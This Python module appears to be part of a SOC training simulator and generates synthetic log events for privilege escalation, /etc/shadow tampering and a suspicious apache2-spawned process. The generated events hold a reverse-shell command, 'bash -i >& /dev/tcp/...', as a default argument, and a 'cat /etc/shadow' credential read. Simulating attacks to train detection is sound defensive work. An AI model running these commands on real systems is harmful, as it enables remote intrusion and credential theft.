"""
System security event simulation module for SOC-SIM.
Simulates privilege escalation, sensitive file tampering, and suspicious process execution.
"""

import uuid
from datetime import datetime, timezone, timedelta
from typing import List, Dict, Any, Optional


class SystemSimulator:
    """Generates synthetic OS-level privilege escalation, file tampering, and execution events."""

    HOST = "srv-app-01"
    INTERNAL_IP = "10.0.1.15"

    @staticmethod
    def generate_privilege_escalation(
        source_ip: str = INTERNAL_IP,
        hostname: str = HOST,
        username: str = "jdoe",
        base_time: Optional[datetime] = None
    ) -> List[Dict[str, Any]]:
        """
        Simulate an unauthorized sudo attempt followed by an attempt to spawn a root shell via sudo.
        """
        if base_time is None:
            base_time = datetime.now(timezone.utc) - timedelta(minutes=10)

        events = [
            {
                "event_id": f"EVT-SYS-{uuid.uuid4().hex[:12].upper()}",
                "timestamp": base_time.isoformat(),
                "hostname": hostname,
                "username": username,
                "source_ip": source_ip,
                "event_category": "process",
                "event_type": "sudo_exec",
                "action": "elevate",
                "result": "denied",
                "metadata": {
                    "command": "/bin/bash",
                    "tty": "pts/2",
                    "error": "user is not in sudoers file. This incident will be reported.",
                    "pid": 4821
                },
                "scenario": "privilege_escalation"
            },
            {
                "event_id": f"EVT-SYS-{uuid.uuid4().hex[:12].upper()}",
                "timestamp": (base_time + timedelta(seconds=18)).isoformat(),
                "hostname": hostname,
                "username": username,
                "source_ip": source_ip,
                "event_category": "process",
                "event_type": "sudo_exec",
                "action": "elevate",
                "result": "success",
                "metadata": {
                    "command": "cat /etc/shadow",
                    "tty": "pts/2",
                    "target_uid": 0,
                    "pid": 4829
                },
                "scenario": "privilege_escalation"
            }
        ]
        return events

    @staticmethod
    def generate_file_modification(
        source_ip: str = INTERNAL_IP,
        hostname: str = HOST,
        username: str = "root",
        target_path: str = "/etc/shadow",
        base_time: Optional[datetime] = None
    ) -> List[Dict[str, Any]]:
        """
        Simulate unauthorized modification of sensitive credentials or security configuration.
        """
        if base_time is None:
            base_time = datetime.now(timezone.utc) - timedelta(minutes=8)

        return [{
            "event_id": f"EVT-FILE-{uuid.uuid4().hex[:12].upper()}",
            "timestamp": base_time.isoformat(),
            "hostname": hostname,
            "username": username,
            "source_ip": source_ip,
            "event_category": "file",
            "event_type": "file_modify",
            "action": "modify",
            "result": "modified",
            "metadata": {
                "filepath": target_path,
                "process_name": "sed",
                "pid": 5012,
                "bytes_written": 1420,
                "checksum_before": "a1b2c3d4e5f67890",
                "checksum_after": "f6e5d4c3b2a10987"
            },
            "scenario": "file_modification"
        }]

    @staticmethod
    def generate_suspicious_process(
        source_ip: str = "198.51.100.45",
        hostname: str = HOST,
        username: str = "www-data",
        command_line: str = "bash -i >& /dev/tcp/198.51.100.45/4444 0>&1",
        base_time: Optional[datetime] = None
    ) -> List[Dict[str, Any]]:
        """
        Simulate spawning of a suspicious shell or reverse socket connection.
        """
        if base_time is None:
            base_time = datetime.now(timezone.utc) - timedelta(minutes=5)

        return [{
            "event_id": f"EVT-PROC-{uuid.uuid4().hex[:12].upper()}",
            "timestamp": base_time.isoformat(),
            "hostname": hostname,
            "username": username,
            "source_ip": source_ip,
            "event_category": "process",
            "event_type": "process_spawn",
            "action": "execute",
            "result": "success",
            "metadata": {
                "command_line": command_line,
                "process_name": "bash",
                "parent_process": "apache2",
                "pid": 6120,
                "parent_pid": 1044,
                "working_dir": "/var/www/html"
            },
            "scenario": "suspicious_process"
        }]
